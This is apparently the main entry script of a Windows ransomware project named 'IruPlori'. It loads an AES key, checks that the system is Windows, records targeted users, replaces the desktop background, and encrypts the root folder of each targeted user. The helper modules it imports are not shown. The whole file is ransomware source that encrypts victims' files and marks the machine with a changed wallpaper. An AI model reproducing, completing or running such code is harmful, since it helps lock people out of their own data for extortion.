from lib import background
from lib import aes
from lib import files
import json
import sys

KEY = json.load(open('data/key.json'))

crypter = aes.AES(KEY)

if __name__ == "__main__":
    # If the operating system is not windows; exit.
    if sys.platform != 'win32':
        sys.exit('ERROR: IruPlori only supports windows.')

    # Write the users that failed and succeeded and change the background.
    files.write_users()

    background.changeBG(background.get_background())

    # Encryption progress.
    for user in files.get_targeted_users():
        crypter.encrypt_root(user)
